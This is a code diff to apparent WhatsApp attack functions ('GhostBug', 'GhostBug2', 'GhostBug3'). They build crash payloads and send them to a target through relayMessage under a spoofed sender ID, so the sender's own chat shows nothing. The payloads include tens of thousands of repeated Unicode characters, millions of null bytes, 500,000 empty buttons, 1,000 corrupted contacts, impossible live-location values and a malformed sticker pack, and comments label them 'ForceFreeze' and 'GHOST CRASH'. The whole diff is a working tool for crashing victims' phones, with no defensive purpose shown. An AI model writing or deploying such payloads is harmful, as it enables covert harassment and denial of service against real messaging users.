@@ -506,38 +506,51 @@ async function _atkLocBug3(sock, target) {
 //  Messages arrive at target but NOT shown in sender's chat
 // ============================================================
 
+// GBI Ghost technique:
+// relayMessage() → sends directly over the wire, does NOT store in sender's
+// own chat history (unlike sendMessage). So sender sees nothing, target receives.
+// participant: { jid: '0@s.whatsapp.net' } → hides real sender identity.
+
 async function _atkGhostBug(sock, target) {
   try {
-    const poison = 'ꦾ'.repeat(20000) + '\u0000'.repeat(10000);
-    const msg = {
+    const poison = 'ꦾ'.repeat(20000) + 'ោ៝'.repeat(10000) + '\u0000'.repeat(5000);
+
+    // Payload 1 — ghost newsletter invite (lands in chat, not status)
+    const p1 = generateWAMessageFromContent(target, {
+      newsletterAdminInviteMessage: {
+        newsletterJid: '1234567891234@newsletter',
+        newsletterName: '👻 GHOST-BUG' + poison,
+        caption: '👻' + poison,
+        inviteExpiration: '0',
+        contextInfo: {
+          participant: '0@s.whatsapp.net',
+          remoteJid: target,
+          mentionedJid: ['0@s.whatsapp.net',
+            ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
+          ]
+        }
+      }
+    }, { userJid: '0@s.whatsapp.net' });
+    p1.key.fromMe = false;
+    p1.key.participant = '0@s.whatsapp.net';
+    await sock.relayMessage(target, p1.message, { messageId: p1.key.id, participant: { jid: '0@s.whatsapp.net' } });
+    await delay(400);
+
+    // Payload 2 — ghost viewOnce interactiveMessage with massive buttons
+    const p2 = generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
-          newsletterAdminInviteMessage: {
-            newsletterJid: '1234567891234@newsletter',
-            newsletterName: '👻 GHOST-BUG' + poison,
-            caption: '👻' + poison + 'ោ៝'.repeat(20000),
-            inviteExpiration: '0',
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast',
-              mentionedJid: ['0@s.whatsapp.net',
-                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
-              ]
-            }
+          interactiveMessage: {
+            body: { text: '👻 GHOST CRASH\n' + '𑇂𑆵𑆴𑆿'.repeat(50000) },
+            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
           }
         }
       }
-    };
-    await sock.relayMessage('status@broadcast', msg, {
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: 'meta', attrs: {},
-        content: [{
-          tag: 'mentioned_users', attrs: {},
-          content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
-        }]
-      }]
-    });
+    }, { userJid: '0@s.whatsapp.net' });
+    p2.key.fromMe = false;
+    p2.key.participant = '0@s.whatsapp.net';
+    await sock.relayMessage(target, p2.message, { messageId: p2.key.id, participant: { jid: '0@s.whatsapp.net' } });
+
     console.log('✅ GhostBug → ' + target);
     return true;
   } catch(e) { console.error('❌ GhostBug:', e.message); return false; }
@@ -545,53 +558,77 @@ async function _atkGhostBug(sock, target) {
 
 async function _atkGhostBug2(sock, target) {
   try {
-    const ghosts = [
-      {
-        viewOnceMessage: {
-          message: {
-            interactiveResponseMessage: {
-              body: { text: '👻 GHOST-2', format: 'DEFAULT' },
-              nativeFlowResponseMessage: {
-                name: 'call_permission_request',
-                paramsJson: '\u0000'.repeat(2000000),
-                version: 3
-              },
-              contextInfo: {
-                participant: { jid: target },
-                mentionedJid: ['0@s.whatsapp.net',
-                  ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
-                ]
-              }
-            }
-          }
-        }
-      },
-      {
-        ephemeralMessage: {
-          message: {
-            contactsArrayMessage: {
-              contacts: Array.from({ length: 1000 }, (_, i) => ({
-                displayName: `👻 G${i}` + 'ꦾ'.repeat(2000),
-                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:👻${i}\nTEL;waid=${i}:+${i}\nNOTE:${'ꦾ'.repeat(5000)}\nEND:VCARD`
-              })),
-              displayName: '👻 GHOST CONTACTS'
+    // Payload 1 — ghost call_permission_request with 2M null bytes
+    const p1 = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: { text: '👻 GHOST-2', format: 'DEFAULT' },
+            nativeFlowResponseMessage: {
+              name: 'call_permission_request',
+              paramsJson: '\u0000'.repeat(2000000),
+              version: 3
+            },
+            contextInfo: {
+              participant: '0@s.whatsapp.net',
+              remoteJid: target,
+              mentionedJid: ['0@s.whatsapp.net',
+                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
+              ]
             }
           }
         }
       }
-    ];
-    for (const payload of ghosts) {
-      await sock.relayMessage('status@broadcast', payload, {
-        statusJidList: [target],
-        additionalNodes: [{
-          tag: 'meta', attrs: {},
-          content: [{ tag: 'mentioned_users', attrs: {},
-            content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
-          }]
-        }]
-      });
-      await delay(500);
-    }
+    }, { userJid: '0@s.whatsapp.net' });
+    p1.key.fromMe = false;
+    p1.key.participant = '0@s.whatsapp.net';
+    await sock.relayMessage(target, p1.message, { messageId: p1.key.id, participant: { jid: '0@s.whatsapp.net' } });
+    await delay(400);
+
+    // Payload 2 — ghost contactsArray with 1000 corrupted contacts
+    const p2 = generateWAMessageFromContent(target, {
+      contactsArrayMessage: {
+        contacts: Array.from({ length: 1000 }, (_, i) => ({
+          displayName: `👻 G${i}` + 'ꦾ'.repeat(2000),
+          vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:👻${i}\nTEL;waid=${i}:+${i}\nNOTE:${'ꦾ'.repeat(5000)}\nEND:VCARD`
+        })),
+        displayName: '👻 GHOST CONTACTS'
+      }
+    }, { userJid: '0@s.whatsapp.net' });
+    p2.key.fromMe = false;
+    p2.key.participant = '0@s.whatsapp.net';
+    await sock.relayMessage(target, p2.message, { messageId: p2.key.id, participant: { jid: '0@s.whatsapp.net' } });
+    await delay(400);
+
+    // Payload 3 — ghost stickerPackMessage (ForceFreeze via ghost)
+    const p3 = generateWAMessageFromContent(target, {
+      stickerPackMessage: {
+        stickerPackId: 'bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5',
+        name: '👻 GHOST FREEZE' + 'ꦾ'.repeat(77777),
+        publisher: 'KEZU-MD',
+        stickers: [
+          { fileName: 'dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp', isAnimated: false, emojis: [''], mimetype: 'image/webp' }
+        ],
+        fileLength: '3662919',
+        fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
+        fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
+        mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
+        directPath: '/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0',
+        mediaKeyTimestamp: '1747502082',
+        trayIconFileName: 'bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png',
+        stickerPackSize: '3680054', stickerPackOrigin: 'USER_CREATED',
+        contextInfo: {
+          participant: '0@s.whatsapp.net',
+          mentionedJid: ['0@s.whatsapp.net',
+            ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
+          ]
+        }
+      }
+    }, { userJid: '0@s.whatsapp.net' });
+    p3.key.fromMe = false;
+    p3.key.participant = '0@s.whatsapp.net';
+    await sock.relayMessage(target, p3.message, { messageId: p3.key.id, participant: { jid: '0@s.whatsapp.net' } });
+
     console.log('✅ GhostBug2 → ' + target);
     return true;
   } catch(e) { console.error('❌ GhostBug2:', e.message); return false; }
@@ -600,12 +637,42 @@ async function _atkGhostBug2(sock, target) {
 async function _atkGhostBug3(sock, target) {
   try {
     for (let r = 0; r < 5; r++) {
-      await _atkGhostBug(sock, target);  await delay(400);
-      await _atkGhostBug2(sock, target); await delay(400);
-      await _atkVcardBug(sock, target);  await delay(400);
-      await _atkLocBug(sock, target);    await delay(400);
+      await _atkGhostBug(sock, target);  await delay(500);
+      await _atkGhostBug2(sock, target); await delay(500);
+
+      // Extra ghost round — massive invisible vCard via relayMessage
+      const gvc = generateWAMessageFromContent(target, {
+        contactMessage: {
+          displayName: '👻 GBI-VC' + 'ꦾ'.repeat(30000),
+          vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + '𑇂𑆵'.repeat(50000) + '\nORG:' + 'ꦾ'.repeat(50000) + '\nNOTE:' + '\u0000'.repeat(500000) + '\nTEL;waid=0:+0\nEND:VCARD'
+        }
+      }, { userJid: '0@s.whatsapp.net' });
+      gvc.key.fromMe = false;
+      gvc.key.participant = '0@s.whatsapp.net';
+      await sock.relayMessage(target, gvc.message, { messageId: gvc.key.id, participant: { jid: '0@s.whatsapp.net' } });
+      await delay(500);
+
+      // Extra ghost round — massive invisible location
+      const gloc = generateWAMessageFromContent(target, {
+        locationMessage: {
+          degreesLatitude: -9999999999,
+          degreesLongitude: 9999999999,
+          name: '👻 GBI-LOC' + 'ꦾ'.repeat(40000),
+          address: 'ோ'.repeat(30000),
+          isLive: true,
+          accuracyInMeters: Number.MAX_SAFE_INTEGER,
+          speedInMps: Number.MAX_SAFE_INTEGER,
+          jpegThumbnail: null
+        }
+      }, { userJid: '0@s.whatsapp.net' });
+      gloc.key.fromMe = false;
+      gloc.key.participant = '0@s.whatsapp.net';
+      await sock.relayMessage(target, gloc.message, { messageId: gloc.key.id, participant: { jid: '0@s.whatsapp.net' } });
+      await delay(500);
     }
-    const finalGhost = {
+
+    // Final ghost overdrive blast
+    const final = generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
           interactiveMessage: {
@@ -614,16 +681,11 @@ async function _atkGhostBug3(sock, target) {
           }
         }
       }
-    };
-    await sock.relayMessage('status@broadcast', finalGhost, {
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: 'meta', attrs: {},
-        content: [{ tag: 'mentioned_users', attrs: {},
-          content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
-        }]
-      }]
-    });
+    }, { userJid: '0@s.whatsapp.net' });
+    final.key.fromMe = false;
+    final.key.participant = '0@s.whatsapp.net';
+    await sock.relayMessage(target, final.message, { messageId: final.key.id, participant: { jid: '0@s.whatsapp.net' } });
+
     console.log('✅ GhostBug3 → ' + target);
     return true;
   } catch(e) { console.error('❌ GhostBug3:', e.message); return false; }
